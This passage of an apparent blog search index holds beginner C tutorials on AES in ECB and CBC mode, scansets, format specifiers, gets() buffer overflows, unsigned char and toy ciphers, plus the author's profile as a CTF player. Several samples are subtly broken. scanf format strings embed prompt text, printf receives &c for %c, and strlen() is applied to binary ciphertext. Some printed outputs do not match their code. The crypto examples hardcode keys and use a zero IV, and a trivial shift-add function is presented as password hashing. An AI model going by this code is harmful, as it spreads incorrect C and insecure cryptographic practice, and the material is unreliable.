AES_BLOCK_SIZE)) { printf(\u0026#34;Error generating random IV\\n\u0026#34;); return 1; } encryptAES_CBC(plaintext, ciphertext, key, iv); printf(\u0026#34;Encrypted Ciphertext: \u0026#34;); for (int i = 0; i \u0026lt; sizeof(ciphertext); i++) { printf(\u0026#34;%02x \u0026#34;, ciphertext[i]); } printf(\u0026#34;\\n\u0026#34;); return 0; } How CBC Mode Works # Initialization Vector (IV): Used to XOR the first block of plaintext. Encryption: Each block of plaintext is XORed with the previous ciphertext block before encryption. Chaining: The output of each encrypted block feeds into the next block‚Äôs encryption step. AES Decryption in CBC Mode # (C Code Example)\nHere‚Äôs how to decrypt data encrypted in CBC mode:\nvoid decryptAES_CBC(const unsigned char *ciphertext, unsigned char *decryptedText, const unsigned char *key, unsigned char *iv) { AES_KEY decryptKey; AES_set_decrypt_key(key, 128, \u0026amp;decryptKey); AES_cbc_encrypt(ciphertext, decryptedText, strlen((const char *)ciphertext), \u0026amp;decryptKey, iv, AES_DECRYPT); } int main() { unsigned char key[16] = \u0026#34;mysecurekey12345\u0026#34;; unsigned char iv[AES_BLOCK_SIZE] = {0x00}; // Ensure the IV is the same as used in encryption unsigned char ciphertext[32] = {0x00}; // Provide actual encrypted data here unsigned char decryptedText[32]; decryptAES_CBC(ciphertext, decryptedText, key, iv); printf(\u0026#34;Decrypted Text: %s\\n\u0026#34;, decryptedText); return 0; } REMARK:\nIn OpenSSL, there is no separate function AES_cbc_decrypt( ) ‚Äî AES_cbc_encrypt( ) serves both encryption and decryption depending on the flag passed (AES_ENCRYPT or AES_DECRYPT). The function name might seem misleading, but it\u0026rsquo;s intentional.\nTo clarify, this line in the code:\nAES_cbc_encrypt(ciphertext, decryptedText, strlen((const char *)ciphertext), \u0026amp;decryptKey, iv, AES_DECRYPT); Key Points # AES_cbc_encrypt() handles both encryption and decryption. The flag AES_DECRYPT triggers decryption. The IV must match exactly what was used during encryption. Applications of AES CBC Mode # AES CBC mode is widely used in:\nSecure Communications: Encrypted VPN connections and TLS protocols File and Disk Encryption: Protecting data at rest Cryptographic Libraries: Implementing secure messaging systems Payment Systems: Securing financial transactions Limitations of CBC Mode # Despite its popularity, CBC mode has some limitations:\nIV Management: Using the same IV repeatedly weakens security. Padding Vulnerabilities: Poor padding schemes can introduce security flaws. Sequential Processing: Blocks must be processed in sequence, reducing parallelism. Best Practices for Secure AES CBC Implementation # Use Secure IVs: Always generate random IVs using secure methods like RAND_bytes( ). Protect Keys: Store and manage encryption keys securely. Use Padding Properly: Ensure correct padding schemes to avoid decryption errors. example of oracle padding Final Thoughts # AES in CBC mode is a powerful and versatile encryption method. By understanding its inner workings and implementing it securely, you can build robust systems to protect sensitive data.\n","date":"8 February 2025","externalUrl":null,"permalink":"/blog/cybersecurity/cryptography/mastering-aes-in-cbc-mode/","section":"Blog","summary":"","title":"Mastering AES in CBC Mode: A Secure Approach to Encryption","type":"blog"},{"content":"","date":"7 February 2025","externalUrl":null,"permalink":"/tags/c/","section":"Tags","summary":"","title":"C","type":"tags"},{"content":" Introduction # In today‚Äôs digital world, data security is more critical than ever. Whether you‚Äôre shopping online or communicating confidential information, encryption plays a vital role in keeping your data safe. One of the most widely used encryption algorithms is AES (Advanced Encryption Standard), known for its speed and security.\nIn this post, we‚Äôll explore what AES is, why it matters, and how to implement it using C code.\nWhat Is AES Encryption? # AES (Advanced Encryption Standard) is a symmetric encryption algorithm, which means the same key is used for both encryption and decryption. Developed by Vincent Rijmen and Joan Daemen, AES was adopted by the U.S. government as the encryption standard in 2001 and remains a cornerstone of modern cryptographic security.\nAES supports three key lengths: 128, 192, and 256 bits, offering varying levels of security Simple AES Encryption in C (Pseudo-Implementation)\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;openssl/aes.h\u0026gt; void encryptAES(const unsigned char *plaintext, const unsigned char *key, unsigned char *ciphertext) { AES_KEY encryptKey; AES_set_encrypt_key(key, 128, \u0026amp;encryptKey); AES_encrypt(plaintext, ciphertext, \u0026amp;encryptKey); } int main() { unsigned char key[16] = \u0026#34;mysecretkey12345\u0026#34;; unsigned char plaintext[16] = \u0026#34;HelloAESWorld!!\u0026#34;; unsigned char ciphertext[16]; encryptAES(plaintext, key, ciphertext); printf(\u0026#34;Encrypted Ciphertext: \u0026#34;); for (int i = 0; i \u0026lt; 16; i++) { printf(\u0026#34;%02x \u0026#34;, ciphertext[i]); } printf(\u0026#34;\\n\u0026#34;); return 0; } Why Is AES Important? # AES has become the encryption standard for countless applications due to its:\nEfficiency: AES is fast, even on resource-constrained devices. Security: Resistant to all known practical attacks, including brute force. Versatility: Used for securing everything from file storage to communication protocols. AES Decryption Example in C # void decryptAES(const unsigned char *ciphertext, const unsigned char *key, unsigned char *decryptedText) { AES_KEY decryptKey; AES_set_decrypt_key(key, 128, \u0026amp;decryptKey); AES_decrypt(ciphertext, decryptedText, \u0026amp;decryptKey); } int main() { unsigned char key[16] = \u0026#34;mysecretkey12345\u0026#34;; unsigned char ciphertext[16] = {0xe2, 0x91, 0x3f, 0x5b, 0xa1, 0x71, 0xf4, 0x2e, 0x6d, 0x4e, 0xae, 0xfb, 0x72, 0xcd, 0xa5, 0x6a}; unsigned char decryptedText[16]; decryptAES(ciphertext, key, decryptedText); printf(\u0026#34;Decrypted Text: %s\\n\u0026#34;, decryptedText); return 0; } How AES Works: # AES operates on blocks of 128 bits and transforms plaintext into ciphertext through multiple rounds of processing. Each round involves:\nSubBytes: Non-linear substitution of bytes using an S-Box. ShiftRows: Row shifting for diffusion. MixColumns: Mixing bytes for further diffusion (except in the final round). AddRoundKey: XOR operation between the block and a round key. Key Schedule in AES # (Round Key Generation)\n#include \u0026lt;openssl/aes.h\u0026gt; void displayRoundKey(const unsigned char *key) { for (int i = 0; i \u0026lt; AES_BLOCK_SIZE; i++) { printf(\u0026#34;%02x \u0026#34;, key[i]); } printf(\u0026#34;\\n\u0026#34;); } int main() { unsigned char key[16] = \u0026#34;testkeyforround\u0026#34;; unsigned char roundKey[AES_BLOCK_SIZE]; AES_KEY aesKey; AES_set_encrypt_key(key, 128, \u0026amp;aesKey); for (int i = 0; i \u0026lt; 11; i++) { printf(\u0026#34;Round %d Key: \u0026#34;, i); displayRoundKey((unsigned char *)\u0026amp;aesKey.rd_key[i * 4]); } return 0; } Applications of AES # AES is widely used across industries and applications, including:\nSecure Communications: Protecting data over TLS and VPNs File Encryption: Keeping sensitive information secure in storage Wireless Security: Protecting Wi-Fi networks through WPA2 Cryptocurrencies: Securing blockchain transactions The Future of AES Encryption # While AES remains one of the most secure algorithms available, emerging technologies like quantum computing present potential threats. Post-quantum cryptography aims to develop encryption algorithms resistant to quantum attacks.\nFinal Thoughts # AES is a critical tool in modern cybersecurity. Understanding how it works and implementing it in code is essential for anyone interested in cryptography or secure software development.\n","date":"7 February 2025","externalUrl":null,"permalink":"/blog/cybersecurity/cryptography/demystifying-aes-cipher-encryption/","section":"Blog","summary":"","title":"Demystifying AES Cipher Encryption: A Comprehensive Guide","type":"blog"},{"content":"Practical tutorials, code snippets, and programming tricks for developers.\n","date":"7 February 2025","externalUrl":null,"permalink":"/blog/programming/","section":"Blog","summary":"","title":"Programming","type":"blog"},{"content":"","date":"7 February 2025","externalUrl":null,"permalink":"/tags/programming/","section":"Tags","summary":"","title":"Programming","type":"tags"},{"content":" Introduction # scanf family functions support scanset specifiers which are represented by %[]. Inside scanset, we can specify single character or range of characters. While processing scanset, scanf will process only those characters which are part of scanset. We can define scanset by putting characters inside square brackets. Please note that the scansets are case-sensitive.\nWe can also use scanset by providing comma in between the character you want to add.\nexample: scanf(%s[A-Z,_,a,b,c]s,str);\nThis will scan all the specified character in the scanset.\nLet us see with example. Below example will store only capital letters to character array ‚Äòstr‚Äô, any other character will not be stored inside character array. /* A simple scanset example */ #include \u0026lt;stdio.h\u0026gt; int main(void) { char str[128]; printf(\u0026#34;Enter a string: \u0026#34;); scanf(\u0026#34;%[A-Z]s\u0026#34;, str); printf(\u0026#34;You entered: %s\\n\u0026#34;, str); return 0; } Output:\n[root@centos-6 C]# ./scan-set Enter a string: DEADs_pro_gramming You entered: DEAD If first character of scanset is ‚Äò^‚Äô, then the specifier will stop reading after first occurrence of that character. For example, given below scanset will read all characters but stops after first occurrence of ‚Äòo‚Äô scanf(\u0026#34;%[^o]s\u0026#34;, str); Let us see with example:\n/* Another scanset example with ^ */ #include \u0026lt;stdio.h\u0026gt; int main(void) { char str[128]; printf(\u0026#34;Enter a string: \u0026#34;); scanf(\u0026#34;%[^o]s\u0026#34;, str); printf(\u0026#34;You entered: %s\\n\u0026#34;, str); return 0; } Output:\n[root@centos-6 C]# ./scan-set Enter a string: http://deads programming You entered: http://deads pr [root@centos-6 C]# Let us implement gets() function by using scan set. gets() function reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF found. /* implementation of gets() function using scanset */ #include \u0026lt;stdio.h\u0026gt; int main(void) { char str[128]; printf(\u0026#34;Enter a string with spaces: \u0026#34;); scanf(\u0026#34;%[^\\n]s\u0026#34;, str); printf(\u0026#34;You entered: %s\\n\u0026#34;, str); return 0; } Output:\n[root@centos-6 C]# ./gets Enter a string with spaces: Deads Programming You entered: Deads Programming [root@centos-6 C]# As a side note, using gets() may not be a good idea in general. Check below note from Linux man page. Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead. Also see this post.\n","date":"7 February 2025","externalUrl":null,"permalink":"/blog/programming/scansets-in-c/","section":"Blog","summary":"","title":"Scansets in C","type":"blog"},{"content":" Introduction # In C programming, format specifiers are used to inform the compiler about the type of data to be printed or read during input and output operations. These specifiers always begin with a % symbol and are used in functions like printf(), scanf(), and sprintf().\nEach format specifier corresponds to a specific data type, such as %d for integers and %c for characters. This guide will cover some of the most commonly used format specifiers and their practical applications.\nList of Format Specifiers # The below table contains the most commonly used format specifiers in C\nExamples of Format Specifiers # Character Format Specifier # The %c is the format specifier for the char data type in C language. It can be used for both formatted input and formatted output in C language.\nSyntax:\nscanf(\u0026#34;%c...\u0026#34;, ...); printf(\u0026#34;%c...\u0026#34;, ...); Example:\n// C Program to illustrate the %c format specifier. #include \u0026lt;stdio.h\u0026gt; int main() { char c; // using %c for character input scanf(\u0026#34;Enter some character: %c\u0026#34;, \u0026amp;c); // using %c for character output printf(\u0026#34;The entered character: %c\u0026#34;, \u0026amp;c); return 0; } Input:\nEnter some character: A Output:\nThe entered character: A Integer Format Specifier (signed) # We can use the signed integer format specifier %d in the scanf() and print() functions or other functions that use formatted string for input and output of int data type.\nSyntax:\nscanf(\u0026#34;%d...\u0026#34;, ...); printf(\u0026#34;%i...\u0026#34;, ...); Example:\n// C Program to demonstrate the use of %d and %i #include \u0026lt;stdio.h\u0026gt; // Driver code int main() { int x; // taking integer input scanf(\u0026#34;Enter the two integers: %d\u0026#34;, \u0026amp;x); // printing integer output printf(\u0026#34;Printed using %%d: %d\\n\u0026#34;, x); printf(\u0026#34;Printed using %%i: %3i\\n\u0026#34;, x); return 0; } Input:\nEnter the integer: 21 Output:\nPrinted using %d: 21 Printed using %i: 21 Unsigned Integer Format Specifier # The %u is the format specifier for the unsigned integer data type. If we specify a negative integer value to the %u, it converts the integer to its 2‚Äôs complement.\nSyntax:\nprintf(\u0026#34;%u...\u0026#34;, ...); scanf(\u0026#34;%u...\u0026#34;, ...); Example:\n// C Program to illustrate the how to use %u #include \u0026lt;stdio.h\u0026gt; int main() { unsigned int var; scanf(\u0026#34;Enter an integer: %u\u0026#34;, \u0026amp;var); printf(\u0026#34;Entered Unsigned Integer: %u\u0026#34;, var); // trying to print negative value using %u printf(\u0026#34;Printing -10 using %%u: %u\\n\u0026#34;, -10); return 0; } Input:\nEnter an integer: 25 Output:\nEntered unsigned integer: 25 Printing -10 using %u: 4294967286 Floating-point format specifier # The %f is the floating point format specifier in C language that can be used inside the formatted string for input and output of float data type. Apart from %f, we can use %e or %E format specifiers to print the floating point value in the exponential form.\nSyntax:\nprintf(\u0026#34;%f...\u0026#34;, ...); scanf(\u0026#34;%e...\u0026#34;, ...); printf(\u0026#34;%E...\u0026#34;, ...); Example:\n// C program to demonstrate the use of %f, %e and %E #include \u0026lt;stdio.h\u0026gt; // driver code int main() { float a = 12.67; printf(\u0026#34;Using %%f: %f\\n\u0026#34;, a); printf(\u0026#34;Using %%e: %e\\n\u0026#34;, a); printf(\u0026#34;Using %%E, %E\u0026#34;, a); return 0; } Output:\nUsing %f: 12.670000 Using %e: 1.267000e+01 Using %E, 1.267000E+01 Unsigned Octal number for integer # We can use the %o format specifier in the C program to print or take input for the unsigned octal integer number.\nSyntax:\nprintf(\u0026#34;%o...\u0026#34;, ...); scanf(\u0026#34;%o...\u0026#34;, ...); Example:\n#include \u0026lt;stdio.h\u0026gt; int main() { int a = 67; printf(\u0026#34;%o\\n\u0026#34;, a); return 0; } Output:\n103 Unsigned Hexadecimal for integer # The %x format specifier is used in the formatted string for hexadecimal integers. In this case, the alphabets in the hexadecimal numbers will be in lowercase. For uppercase alphabet digits, we use %X instead.\nSyntax:\nprintf(\u0026#34;%x...\u0026#34;, ...); scanf(\u0026#34;%X...\u0026#34;, ...); Example:\n// C Program to demonstrate the use of %x and %X #include \u0026lt;stdio.h\u0026gt; int main() { int a = 15454; printf(\u0026#34;%x\\n\u0026#34;, a); printf(\u0026#34;%X\u0026#34;, a); return 0; } Output:\n3c5e 3C5E String Format Specifier # The %s in C is used to print strings or take strings as input.\nSyntax:\nprintf(\u0026#34;%s...\u0026#34;, ...); scanf(\u0026#34;%s...\u0026#34;, ...); Example:\n// C program to illustrate the use of %s in C #include \u0026lt;stdio.h\u0026gt; int main() { char a[] = \u0026#34;Hi Guys\u0026#34;; printf(\u0026#34;%s\\n\u0026#34;, a); return 0; } Output:\nHi Guys Example: The working of %s with scanf() is a little bit different from its working with printf(). Let‚Äôs understand this with the help of the following C program. // C Program to illustrate the working of %s with scanf() #include \u0026lt;stdio.h\u0026gt; int main() { char str[50]; // taking string as input scanf(\u0026#34;Enter the String: %s\u0026#34;, str); printf(\u0026#34;Entered String: %s\u0026#34;, str); return 0; } Input:\nEnter the string: Hi Guys Output:\nHi As we can see, the string is only scanned till a whitespace is encountered. We can avoid that by using scansets in C.\nAddress Format Specifier # The C language also provides the format specifier to print the address/pointers. We can use %p to print addresses and pointers in C\nSyntax:\nprintf(\u0026#34;%p...\u0026#34;, ...); Example:\n#include \u0026lt;stdio.h\u0026gt; int main() { int a = 10; printf(\u0026#34;The Memory Address of a: %p\\n\u0026#34;,(void*)\u0026amp;a); return 0; } Output:\nThe Memory Address of a: 0x7ffe9645b3fc Input and Output Formatting # C language provides some tools using which we can format the input and output. They are generally inserted between the % sign and the format specifier symbol Some of them are as follows:\nA minus(-) sign tells left alignment. A number after % specifies the minimum field width to be printed if the characters are less than the size of the width the remaining space is filled with space and if it is greater then it is printed as it is without truncation. A period( . ) symbol separates field width with precision. Precision tells the minimum number of digits in an integer, the maximum number of characters in a string, and the number of digits after the decimal part in a floating value. Example of I/O Formatting # // C Program to demonstrate the formatting methods. #include \u0026lt;stdio.h\u0026gt; int main() { char str[] = \u0026#34;unlimitedcodes\u0026#34;; printf(\u0026#34;%20s\\n\u0026#34;, str); printf(\u0026#34;%-20s\\n\u0026#34;, str); printf(\u0026#34;%20.5s\\n\u0026#34;, str); printf(\u0026#34;%-20.5s\\n\u0026#34;, str); return 0; } Output:\nunlimitedcodes unlimitedcodes unlim unlim Common Questions # Does C have a format specifier for binary numbers?\nNo, the C language does not provide a format specifier for binary numbers. What is the formatted string?\nThe input and output functions in C take a string as an argument that decides how the data is displayed on the screen or the data is retrieved to the memory. This string is called the formatted string. ","date":"6 February 2025","externalUrl":null,"permalink":"/blog/programming/format-specifiers-in-c/","section":"Blog","summary":"","title":"Format Specifiers in C","type":"blog"},{"content":"BUFFER OVERFLOW Consider the below program.\nvoid read() { char str[20]; gets(str); printf(\u0026#34;%s\u0026#34;, str); return; } The code looks simple, it reads string from standard input and prints the entered string, but it suffers from Buffer Overflow as gets() doesn‚Äôt do any array bound testing. gets() keeps on reading until it sees a newline character. To avoid Buffer Overflow, fgets() should be used instead of gets() as fgets() makes sure that not more than MAX_LIMIT characters are read.\n#define MAX_LIMIT 20 void read() { char str[MAX_LIMIT]; fgets(str, MAX_LIMIT, stdin); printf(\u0026#34;%s\u0026#34;, str); getchar(); return; } NOTE: fgets() stores the ‚Äò\\n‚Äô character if it is read, so removing that has to be done explicitly by the programmer. It is hence, generally advised that your str can store at least (MAX_LIMIT + 1) characters if your intention is to keep the newline character. This is done so there is enough space for the null terminating character ‚Äò\\0‚Äô to be added at the end of the string.\nIf keeping the newline character is not intended, then one can simply do the following: int len = strlen(str); // Remove the \u0026#39;\\n\u0026#39; character and replace it with \u0026#39;\\0\u0026#39; str[len - 1] = \u0026#39;\\0\u0026#39;; ","date":"6 February 2025","externalUrl":null,"permalink":"/blog/programming/gets-is-risky-to-use/","section":"Blog","summary":"","title":"gets() is risky to use!","type":"blog"},{"content":" Introduction # char is the most basic data type in C. It stores a single character and requires a single byte of memory in almost all compilers.\nNow character datatype can be divided into 2 types:\nsigned char\nunsigned char\nunsigned char # unsigned char is a character datatype where the variable consumes all the 8 bits of the memory and there is no sign bit (which is there in signed char). So it means that the range of unsigned char data type ranges from 0 to 255. Syntax:\nunsigned char [variable_name] = [value] Example:\nunsigned char ch = \u0026#39;a\u0026#39;; Initializing an unsigned char # Initializing an unsigned char: Here we try to insert a char in the unsigned char variable with the help of ASCII value. So the ASCII value 97 will be converted to a character value, i.e. ‚Äòa‚Äô and it will be inserted in unsigned char. // C program to show unsigned char #include \u0026lt;stdio.h\u0026gt; int main() { int chr = 97; unsigned char i = chr; printf(\u0026#34;unsigned char: %c\\n\u0026#34;, i); return 0; } Output:\nunsigned char: a Initializing an unsigned char with signed value: Here we try to insert a char in the unsigned char variable with the help of ASCII value. So the ASCII value -1 will be first converted to a range 0‚Äì255 by rounding. So it will be 255. Now, this value will be converted to a character value, i.e. ‚Äò√ø‚Äô and it will be inserted in unsigned char. // C program to show unsigned char #include \u0026lt;stdio.h\u0026gt; int main() { int chr = -1; unsigned char i = chr; printf(\u0026#34;unsigned char: %c\\n\u0026#34;, i); return 0; } Output:\nunsigned char: √ø ","date":"5 February 2025","externalUrl":null,"permalink":"/blog/programming/unsigned-char-in-c-with-examples/","section":"Blog","summary":"","title":"Unsigned char in C with Examples","type":"blog"},{"content":" Introduction # In an increasingly digital world, protecting information has never been more critical. One of the oldest and most effective ways to secure data is through ciphering \u0026mdash; the process of converting plain information into unreadable text using cryptographic techniques. In this post, we\u0026rsquo;ll explore the basics of ciphering, its historical significance, and its modern applications, complete with C code examples.\nWhat Is Ciphering? # Ciphering is the process of transforming readable information (plaintext) into an encoded format (ciphertext) to protect it from unauthorized access.\nBelow is a simple example in C that uses a basic substitution cipher to encrypt a message by shifting each character: #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void encryptMessage(char *message, int shift) { for (int i = 0; i \u0026lt; strlen(message); i++) { if (message[i] \u0026gt;= \u0026#39;A\u0026#39; \u0026amp;\u0026amp; message[i] \u0026lt;= \u0026#39;Z\u0026#39;) { message[i] = ((message[i] - \u0026#39;A\u0026#39; + shift) % 26) + \u0026#39;A\u0026#39;; } else if (message[i] \u0026gt;= \u0026#39;a\u0026#39; \u0026amp;\u0026amp; message[i] \u0026lt;= \u0026#39;z\u0026#39;) { message[i] = ((message[i] - \u0026#39;a\u0026#39; + shift) % 26) + \u0026#39;a\u0026#39;; } } } int main() { char message[] = \u0026#34;HelloWorld\u0026#34;; int shift = 3; encryptMessage(message, shift); printf(\u0026#34;Encrypted Message: %s\\n\u0026#34;, message); return 0; } Classic Example: Caesar Cipher in C # Here‚Äôs a practical implementation of the classic Caesar cipher:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void caesarCipher(char *text, int shift) { for (int i = 0; i \u0026lt; strlen(text); i++) { if (text[i] \u0026gt;= \u0026#39;A\u0026#39; \u0026amp;\u0026amp; text[i] \u0026lt;= \u0026#39;Z\u0026#39;) { text[i] = ((text[i] - \u0026#39;A\u0026#39; + shift) % 26) + \u0026#39;A\u0026#39;; } else if (text[i] \u0026gt;= \u0026#39;a\u0026#39; \u0026amp;\u0026amp; text[i] \u0026lt;= \u0026#39;z\u0026#39;) { text[i] = ((text[i] - \u0026#39;a\u0026#39; + shift) % 26) + \u0026#39;a\u0026#39;; } } } int main() { char text[] = \u0026#34;SimpleText\u0026#34;; int shift = 5; caesarCipher(text, shift); printf(\u0026#34;Encrypted Caesar Cipher: %s\\n\u0026#34;, text); return 0; } Types of Ciphers # Substitution Cipher # #include \u0026lt;stdio.h\u0026gt; void simpleSubstitution(char *text) { for (int i = 0; text[i] != \u0026#39;\\0\u0026#39;; i++) { text[i] ^= 0x20; } } int main() { char text[] = \u0026#34;HelloCipher\u0026#34;; simpleSubstitution(text); printf(\u0026#34;After Substitution Cipher: %s\\n\u0026#34;, text); return 0; } Transposition Cipher # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void reverseCipher(char *text) { int len = strlen(text); for (int i = 0; i \u0026lt; len / 2; i++) { char temp = text[i]; text[i] = text[len - i - 1]; text[len - i - 1] = temp; } } int main() { char text[] = \u0026#34;CipherExample\u0026#34;; reverseCipher(text); printf(\u0026#34;Transposition Cipher: %s\\n\u0026#34;, text); return 0; } Importance of Ciphering # Ciphering ensures secure communication by making messages unreadable to unauthorized parties.\nHere‚Äôs an example using an XOR-based cipher in C:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void xorCipher(char *text, char key) { for (int i = 0; i \u0026lt; strlen(text); i++) { text[i] ^= key; } } int main() { char text[] = \u0026#34;SensitiveData\u0026#34;; char key = \u0026#39;K\u0026#39;; xorCipher(text, key); printf(\u0026#34;Ciphered Text: %s\\n\u0026#34;, text); xorCipher(text, key); printf(\u0026#34;Deciphered Text: %s\\n\u0026#34;, text); return 0; } Applications of Ciphering # One basic example is simple password hashing using bitwise operations in C:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; unsigned int hashPassword(char *password) { unsigned int hash = 0; for (int i = 0; i \u0026lt; strlen(password); i++) { hash = (hash \u0026lt;\u0026lt; 5) + password[i]; } return hash; } int main() { char password[] = \u0026#34;MySecurePassword\u0026#34;; unsigned int hash = hashPassword(password); printf(\u0026#34;Password Hash: %u\\n\u0026#34;, hash); return 0; } Ciphering is fundamental to many areas of cybersecurity, ensuring confidentiality, integrity, and privacy in data transmission and storage.\nThe Future of Ciphering # As technology evolves, the need for more advanced cryptographic techniques becomes evident. Quantum-resistant algorithms are becoming increasingly important. While such advanced methods are beyond what simple C code can demonstrate, staying informed is essential. ","date":"4 February 2025","externalUrl":null,"permalink":"/blog/cybersecurity/cryptography/unlocking-the-secrets-of-ciphering/","section":"Blog","summary":"","title":"Unlocking the Secrets of Ciphering: A Beginner‚Äôs Guide to Cryptography","type":"blog"},{"content":" WHOAMI # Hello everyone, I\u0026rsquo;m Mazen Elheni, AKA Deadnaut, a Tunisian, 21 yo, Computer Science student at ISSATSO.\nI\u0026rsquo;m a CTF player with Phr34k$ üêß and technical team member at CyberTrace.\nI mainly play Cryptography, but I also dabble in Reverse Engineering and Forensics challenges.\nThis blog contains writeups of the challenges I play or author and also my inside thoughts in cybersecurity fields.\nCVEs # No public ones yet üò≠\nINTERESTS # Cryptography got boring, so I\u0026rsquo;m exploring these topics:\nPenetration testing (currently studying the OSCP) Malware development (still reading DOCS, haven\u0026rsquo;t started yet) Red teaming Kernel exploitation (currently exploring the Linux kernel) Browser exploitation (very interesting, still noob tho) Goals # I aim to contribute to innovative security projects and collaborate with like-minded professionals, working to build secure and resilient digital environments.\n","externalUrl":null,"permalink":"/about/","section":"About","summary":"","title":"About","type":"about"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"You can view or download my resume below:\nDownload Resume (PDF)\n","externalUrl":null,"permalink":"/resume/","section":"Resume","summary":"","title":"Resume","type":"resume"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]